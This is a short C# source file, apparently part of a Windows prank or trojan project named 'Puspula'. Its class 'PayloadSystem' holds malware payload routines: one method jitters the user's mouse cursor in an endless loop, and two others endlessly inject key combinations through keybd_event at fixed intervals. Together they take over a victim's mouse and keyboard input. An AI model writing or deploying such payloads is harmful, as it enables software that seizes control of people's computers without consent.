using System;
using static Vanara.PInvoke.User32;
using static Vanara.PInvoke.Gdi32;
using static Vanara.PInvoke.Kernel32;
using System.Threading;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Puspula
{
    public class PayloadSystem
    {
        public static void MoveMouse()
        {
            var random = new Random();
            Point lastCursorPos;
            GetCursorPos(out lastCursorPos);

            while (true)
            {
                Point currentCursorPos;
                GetCursorPos(out currentCursorPos);

                if (currentCursorPos.X != lastCursorPos.X || currentCursorPos.Y != lastCursorPos.Y)
                {
                    lastCursorPos = currentCursorPos;
                }

                int offsetX = random.Next(-3, 4);
                int offsetY = random.Next(-3, 4);

                SetCursorPos(lastCursorPos.X + offsetX, lastCursorPos.Y + offsetY);

                Sleep(10);
            }
            Thread.Sleep(1);
        }

        public static void PressKey(byte key, byte key2, byte key3)
        {
            while (true)
            {
                keybd_event(key, 0, 0, IntPtr.Zero);

                keybd_event(key2, 0, 0, IntPtr.Zero);

                keybd_event(key, 0, KEYEVENTF.KEYEVENTF_KEYUP, IntPtr.Zero);

                keybd_event(key2, 0, KEYEVENTF.KEYEVENTF_KEYUP, IntPtr.Zero);

                Thread.Sleep(1000 * 5);
                keybd_event(key3, 0, 0, IntPtr.Zero);
                keybd_event(key3, 0, KEYEVENTF.KEYEVENTF_KEYUP, IntPtr.Zero);
            }
        }

        public static void PressKeySpeed(byte key, byte key2, byte key3)
        {
            while (true)
            {
                keybd_event(key, 0, 0, IntPtr.Zero);

                keybd_event(key2, 0, 0, IntPtr.Zero);

                keybd_event(key, 0, KEYEVENTF.KEYEVENTF_KEYUP, IntPtr.Zero);

                keybd_event(key2, 0, KEYEVENTF.KEYEVENTF_KEYUP, IntPtr.Zero);

                Thread.Sleep(500);
                keybd_event(key3, 0, 0, IntPtr.Zero);
                keybd_event(key3, 0, KEYEVENTF.KEYEVENTF_KEYUP, IntPtr.Zero);
            }
        }
    }
}
